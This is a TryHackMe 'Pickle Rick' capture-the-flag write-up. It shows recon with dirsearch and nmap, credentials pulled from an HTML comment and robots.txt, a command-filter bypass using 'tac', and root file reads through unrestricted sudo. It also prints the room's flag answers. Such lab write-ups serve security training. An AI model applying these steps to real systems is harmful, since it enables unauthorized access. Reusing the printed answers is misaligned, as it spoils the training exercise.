# Pickle Rick Room Writeup
#pentest/tryhackme

Navigating to the main page informs us that we need to find 3 ingredients to turn Rick back into a human. Classic….

Let's see if we can find anything interesting on the page source.

```html
...
background-image: url("assets/rickandmorty.jpeg");
...
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

We get a free username and the assets directory, not bad! 
Let's run **dirsearch** and try to find other interesting directories.

```bash
$ python3 dirsearch.py -u <machine-ip> --extensions-list
Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 8688
...
[20:33:32] 301 -  313B  - /assets  ->  http://10.10.31.132/assets/                                                
[20:34:18] 200 -    1KB - /index.html                                                                          
[20:34:27] 200 -  882B  - /login.php                                                                    
[20:35:01] 200 -   17B  - /robots.txt 
...
```

Interesting! What do we have in **/robots.txt**?

```html
Wubbalubbadubdub
```

Hey, what is this? A password potentially? Let’s run  **nmap** and see if it can help us figure out another service or port. Let’s find out services versions with `-sV` .

```bash
kali@kali:~$ nmap -sV <machine-ip>
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Nothing much here… time to explore **login.php** and try our credentials.
We are in! It seems we can execute commands on the host machine, pretty neat!

```
> ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

> cat Sup3rS3cretPickl3Ingred.txt
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.

>tac Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

> ls /home
rick
ubuntu

> ls /hone/rick
second ingredients

> tac /home/rick/'second ingredients'
1 jerry tear

> ls /root
```

Nothing in root? I doubt it. Which permissions do we have as sudo?

```shell
> sudo -l
...
User www-data may run the following commands on ip-10-10-31-132.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

That’s crazy, we can run anything as sudo!

```shell
> sudo ls /root
3rd.txt
snap

> sudo tac /root/3rd.txt
3rd ingredients: fleeb juice
```

We did it! 